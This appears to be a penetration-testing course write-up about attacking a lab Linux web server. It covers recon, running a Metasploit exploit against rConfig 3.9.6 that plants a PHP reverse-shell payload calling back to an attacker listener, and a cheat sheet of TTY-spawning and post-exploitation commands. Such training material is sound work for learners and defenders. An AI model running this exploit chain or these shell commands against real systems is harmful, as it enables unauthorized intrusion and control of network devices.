# Shells & Payloads: NIX Shells & Spawning Interactive Shells

---

## Table of Contents

1. [Recon checklist before attacking a Linux target](#1-recon-checklist-before-attacking-a-linux-target)
2. [Enumerating a Linux web server](#2-enumerating-a-linux-web-server)
3. [Finding and exploiting rConfig 3.9.6](#3-finding-and-exploiting-rconfig-396)
4. [The difference between a Meterpreter shell and a system shell](#4-the-difference-between-a-meterpreter-shell-and-a-system-shell)
5. [The problem: non-TTY shells](#5-the-problem-non-tty-shells)
6. [Spawning a TTY shell with Python](#6-spawning-a-tty-shell-with-python)
7. [Alternative TTY spawning methods](#7-alternative-tty-spawning-methods)
8. [Checking permissions after landing](#8-checking-permissions-after-landing)
9. [Cheat sheet](#9-cheat-sheet)

---

## 1. Recon checklist before attacking a Linux target

Before launching at a Linux system, work through these five questions. The answers shape both what exploit paths exist and what you can do after landing a shell:

| Question | Why it matters |
|---|---|
| **What Linux distribution is running?** | Affects available tools, package managers, default shells, and known OS-level CVEs |
| **What shells and programming languages are on the system?** | Determines which one-liners and TTY-spawn methods you can use post-exploitation |
| **What role does this system play in the network?** | A web server, database server, or config management tool all carry different blast-radius implications |
| **What application is it hosting?** | The application version is often the most direct exploit path |
| **Are there known vulnerabilities?** | Nmap version output + a quick CVE search can point you straight to a working exploit |

**Analogy:** think of these as the "5 Ws" of a journalism story — Who (what user will we land as?), What (what's running?), Where (what network role?), When (what versions/dates?), Why (what's the attack surface?). Answering them before touching an exploit saves time and prevents going down unproductive rabbit holes.

---

## 2. Enumerating a Linux web server

```bash
$ nmap -sC -sV 10.129.201.101

PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 2.0.8 or later
22/tcp   open  ssh      OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
443/tcp  open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
3306/tcp open  mysql    MySQL (unauthorized)
111/tcp  open  rpcbind  2-4 (RPC #100000)
```

### Reading the scan results

| Finding | Interpretation |
|---|---|
| **Ports 80 + 443 (HTTP/HTTPS)** | Web server — almost certainly hosting a web application |
| **Apache 2.4.6 + PHP 7.2.34** | The web stack version — worth searching for CVEs, but the *app* running on top is usually a better entry point |
| **CentOS** | The Linux distribution — CentOS uses `yum`/`dnf`, ships with specific default tools |
| **Port 3306 MySQL** | Database server on the same host — if we get code execution, we may be able to interact with it |
| **Port 21 FTP** | Potential file transfer / upload vector |
| **Port 22 SSH** | If we find credentials anywhere, we can try SSH directly |

**Key decision:** multiple paths exist here, but the web application is the most promising first target — it's the most likely to have a user-facing exploit.

### Visiting the web app

Navigating to the IP in a browser reveals **rConfig** — a **network configuration management tool** used by admins to configure routers, switches, and other appliances remotely.

**Why this is a critical finding:** rConfig likely has **administrator-level access to every network device** in the environment. Compromising it means potentially owning the entire network, not just one server. This would be flagged as a critical severity finding in a real engagement.

The rConfig version is visible at the bottom of the login page: **3.9.6**.

---

## 3. Finding and exploiting rConfig 3.9.6

### Step 1: search for a module in Metasploit

```
msf6 > search rconfig

   #  Name                                             Disclosure Date  Rank       Check  Description
   -  ----                                             ---------------  ----       -----  -----------
   0  exploit/multi/http/solr_velocity_rce             2019-10-29       excellent  Yes    Apache Solr Remote Code Execution via Velocity Template
   1  auxiliary/gather/nuuo_cms_file_download          2018-10-11       normal     No     Nuuo Central Management Server Authenticated Arbitrary File Download
   2  exploit/linux/http/rconfig_ajaxarchivefiles_rce  2020-03-11       good       Yes    Rconfig 3.x Chained Remote Code Execution
   3  exploit/unix/webapp/rconfig_install_cmd_exec     2019-10-28       excellent  Yes    rConfig install Command Execution
```

The search returns results, but **the specific exploit for version 3.9.6 may not appear** if your Metasploit installation isn't fully up to date. This is a common situation.

### Step 2: when MSF search comes up short — go to GitHub

Rapid7 (Metasploit's maintainer) stores all official exploit modules on GitHub. Searching:

```
rConfig 3.9.6 exploit metasploit github
```

...turns up the source file `rconfig_vendors_auth_file_upload_rce.rb`. Download it and place it in Metasploit's exploits directory:

```bash
# Find where MSF keeps its exploits
$ locate exploits | grep metasploit

/usr/share/metasploit-framework/modules/exploits   ← this is the target directory


# Copy the .rb file to the right subfolder
$ cp ~/Downloads/rconfig_vendors_auth_file_upload_rce.rb \
  /usr/share/metasploit-framework/modules/exploits/linux/http/rconfig_vendors_auth_file_upload_rce.rb
```

> **Naming convention reminder**: always use `snake_case` with alphanumeric characters and underscores — no dashes. A wrong filename will prevent MSF from recognizing the module.

**Keep MSF up to date:**

```bash
$ sudo apt update && sudo apt install metasploit-framework
```

### Step 3: load and run the exploit

```
msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
```

After configuring RHOSTS, LHOST, and LPORT:

```
msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > exploit

[*] Started reverse TCP handler on 10.10.14.111:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] 3.9.6 of rConfig found !
[+] The target appears to be vulnerable. Vulnerable version of rConfig found !
[+] We successfully logged in !
[*] Uploading file 'olxapybdo.php' containing the payload...
[*] Triggering the payload ...
[*] Sending stage (39282 bytes) to 10.129.201.101
[+] Deleted olxapybdo.php
[*] Meterpreter session 1 opened (10.10.14.111:4444 -> 10.129.201.101:38860)

meterpreter >
```

### What this exploit actually did, step by step

```
1. Checked the rConfig version matches 3.9.6             → confirms vulnerable
2. Authenticated to the rConfig web login                → used default or found creds
3. Uploaded a PHP file (olxapybdo.php) containing a reverse shell payload
4. Triggered the PHP file by visiting its URL            → executes the payload
5. Reverse shell calls back to our listener              → Meterpreter session opens
6. Deleted the PHP file                                  → tried to clean up artifacts
```

> **Note the cleanup step:** the exploit tries to delete the uploaded file after execution. Although cleanup isn't always guaranteed. Here it succeeded, but the lesson remains: always verify cleanup yourself.

---

## 4. The difference between a Meterpreter shell and a system shell

After landing in Meterpreter, you can drop into the actual OS shell with the `shell` command:

```
meterpreter > shell

Process 3958 created.
Channel 0 created.
dir
ajax-loader.gif  cisco.jpg  juniper.jpg
```

Notice something odd: **there is no prompt.** You can run commands and see output, but there's no `$` or `#` to indicate where you are. This is a **non-TTY shell** — and it creates real problems.

---

## 5. The problem: non-TTY shells

A **TTY** (TeleTYpewriter) is a terminal interface that provides a full interactive environment — a prompt, job control (Ctrl+C, Ctrl+Z), cursor positioning, and proper input/output streams.

A **non-TTY shell** is a raw I/O channel with none of that. It looks like a shell but is missing the infrastructure that makes it truly interactive.

**Why this matters in practice:**

| Command | Works in TTY? | Works in non-TTY? |
|---|---|---|
| `whoami`, `ls`, `dir` | ✅ | ✅ |
| `su` (switch user) | ✅ | ❌ Often fails |
| `sudo` | ✅ | ❌ Often fails |
| Interactive prompts (password prompts, confirmations) | ✅ | ❌ |
| Text editors (`vi`, `nano`) | ✅ | ❌ |
| Tab completion | ✅ | ❌ |

**Why we landed in a non-TTY shell:** the payload was executed by the **apache** user (the web server's service account). Apache isn't a user that logs in interactively, so no shell interpreter path is defined in its environment variables. The system never set up a proper TTY for it because there was never a login session.

> **Analogy:** a non-TTY shell is like being handed a walkie-talkie that only does push-to-talk. You can hear and speak, but you can't have a real phone call — no hold, no three-way calling, no voicemail.

---

## 6. Spawning a TTY shell with Python

The quickest fix when Python is available:

### Check if Python exists

```bash
which python
# or
which python3
```

### Spawn the TTY

```bash
python -c 'import pty; pty.spawn("/bin/sh")'

sh-4.2$
sh-4.2$ whoami
apache
```

**What this does:**
- `python -c '...'` — run a Python one-liner
- `import pty` — load Python's pseudoterminal module
- `pty.spawn("/bin/sh")` — spawn `/bin/sh` **through a proper pseudoterminal**, giving it a real TTY environment

You'll know it worked because a **prompt appears** (`sh-4.2$`). You still land as the `apache` user, but now you have a full interactive shell to work with.

---

## 7. Alternative TTY spawning methods

Python isn't always available. The table below covers every common fallback, organized by tool/language. Each spawns `/bin/sh` or `/bin/bash` — replace with the shell binary available on the system.

> **Important:** whenever you see `/bin/sh` in these examples, it can be substituted with any shell binary present — `/bin/bash`, `/bin/zsh`, etc.

### Direct shell invocation

```bash
/bin/sh -i
```

Launches `/bin/sh` in interactive mode (`-i`). Simple but effective when the binary is directly accessible.

```
sh: no job control in this shell
sh-4.2$
```

---

### Python (most common)

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
# or for Python 3
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

---

### Perl

```bash
perl -e 'exec "/bin/sh";'
```

Or inside a Perl script:

```perl
exec "/bin/sh";
```

---

### Ruby

Inside a Ruby script:

```ruby
exec "/bin/sh"
```

---

### Lua

Inside a Lua script or interactive session:

```lua
os.execute('/bin/sh')
```

---

### AWK

AWK is a text-processing tool present on nearly all Unix/Linux systems — not just for reports, apparently:

```bash
awk 'BEGIN {system("/bin/sh")}'
```

**This one is especially useful** because AWK is part of the POSIX standard — it's on virtually every Unix/Linux system by default, even stripped-down ones where Python, Perl, and Ruby might be absent.

---

### find (two variants)

`find` is used to search for files, but its `-exec` flag can run arbitrary commands:

**Variant 1: via AWK**

```bash
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```

Searches for a file named `nameoffile` and uses `-exec` to run the AWK shell-spawn script.

**Variant 2: direct shell exec**

```bash
find . -exec /bin/sh \; -quit
```

Cleaner — directly executes `/bin/sh` via `-exec`, then immediately quits `find`. The `-quit` stops `find` from continuing to search after the first match.

---

### VIM

Unusual, but useful when you have VIM access in a restricted environment:

**Method 1: from the command line**

```bash
vim -c ':!/bin/sh'
```

The `-c` flag runs a VIM command immediately on startup. `:!` in VIM runs a shell command. This drops you straight into `/bin/sh`.

**Method 2: from inside an open VIM session**

```vim
:set shell=/bin/sh
:shell
```

`:set shell=` changes VIM's configured shell, then `:shell` launches it.

---

### Quick reference: which tool to try first

```
Is Python available?       → python -c 'import pty; pty.spawn("/bin/sh")'   (most reliable)
Is Perl available?         → perl -e 'exec "/bin/sh";'
Is AWK available?          → awk 'BEGIN {system("/bin/sh")}'                 (almost always present)
Is find available?         → find . -exec /bin/sh \; -quit                   (also almost always present)
Is Ruby/Lua available?     → exec "/bin/sh" / os.execute('/bin/sh')
Is VIM open/available?     → vim -c ':!/bin/sh'
Nothing else works?        → /bin/sh -i
```

---

## 8. Checking permissions after landing

Once you have a stable shell, **immediately check what you can do** before diving into manual exploration. Two commands give a fast picture:

### File permissions

```bash
ls -la <path/to/file/or/binary>
```

Shows the full permission string, owner, and group for a file or binary. Use this to check if you can read, write, or execute anything sensitive.

### sudo permissions

```bash
sudo -l
```

Lists every command the current user can run with `sudo`, and whether a password is required.

```
Matching Defaults entries for apache on ILF-WebSrv:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User apache may run the following commands on ILF-WebSrv:
    (ALL : ALL) NOPASSWD: ALL
```

**`(ALL : ALL) NOPASSWD: ALL`** means the `apache` user can run **any command as any user, with no password**. This is an enormous misconfiguration — it effectively means we already have root access from this landing point.

> **Important:** `sudo -l` requires a **stable, interactive shell** to work. If you're in a non-TTY shell, it may return nothing even if permissions exist. This is another reason why getting a full TTY first matters.

---

## 9. Cheat sheet

### Pre-attack recon checklist

```
1. What Linux distro is running?               → nmap -sC -sV, banner text
2. What shells/languages are available?        → which python python3 perl ruby lua
3. What role does the host play?               → web server? DB? config mgmt?
4. What application is it hosting?             → visit port 80/443, check version numbers
5. Any known vulnerabilities?                  → search CVE databases, MSF search, GitHub
```

### Module import workflow (for missing MSF modules)

```bash
1. Search Google: "rConfig 3.9.6 exploit metasploit github"
2. Download/copy the .rb file
3. sudo cp <file>.rb /usr/share/metasploit-framework/modules/exploits/<category>/<name>.rb
4. msfconsole → reload_all
5. use exploit/<category>/<name>
```

### TTY spawning methods, ordered by availability

| Method | Command | Notes |
|---|---|---|
| Python | `python -c 'import pty; pty.spawn("/bin/sh")'` | Most reliable, common on most systems |
| Python 3 | `python3 -c 'import pty; pty.spawn("/bin/sh")'` | Modern systems |
| Perl | `perl -e 'exec "/bin/sh";'` | Usually available |
| AWK | `awk 'BEGIN {system("/bin/sh")}'` | Near-universal on POSIX systems |
| find | `find . -exec /bin/sh \; -quit` | Near-universal |
| `/bin/sh -i` | `/bin/sh -i` | Always available if sh exists |
| Ruby | `exec "/bin/sh"` (in script) | Only if Ruby is installed |
| Lua | `os.execute('/bin/sh')` (in script) | Only if Lua is installed |
| VIM | `vim -c ':!/bin/sh'` | Only if VIM is accessible |

### Post-landing permission checks

```bash
sudo -l                           # What can I sudo, and is a password needed?
ls -la <path/to/binary>           # What permissions does this file have?
id                                # What user/groups am I?
cat /etc/passwd                   # What users exist on the system?
```

### Non-TTY vs. TTY quick check

```
No prompt visible after shell?    → You're in a non-TTY shell → spawn a TTY first
Prompt visible ($ or #)?          → You're in a TTY → proceed
```

### Big-picture takeaways

1. **Answer the 5 recon questions before choosing an exploit path** — especially what application is running and its version number.
2. **The application version is usually the fastest exploit path** — not the OS or web stack version.
3. **If a module doesn't appear in MSF search, check GitHub** — Rapid7's repo may have it even if your local install is behind.
4. **Non-TTY shells are limited** — `su`, `sudo`, and interactive programs won't work reliably. Always upgrade to a TTY as a first step.
5. **Python's `pty.spawn()` is the fastest TTY upgrade**, but AWK and `find` are reliable fallbacks since they're on almost every Unix system.
6. **Landing as a service account (like `apache`) is normal** — you won't have full privileges immediately, but `sudo -l` might reveal a misconfiguration that hands you everything.
7. **`(ALL : ALL) NOPASSWD: ALL` in `sudo -l`** is a critical misconfiguration — it means unrestricted root access with no password from whatever account you landed on.
8. **Always try more than one fingerprinting/recon method** — no single check is definitive, especially on hardened systems.

---
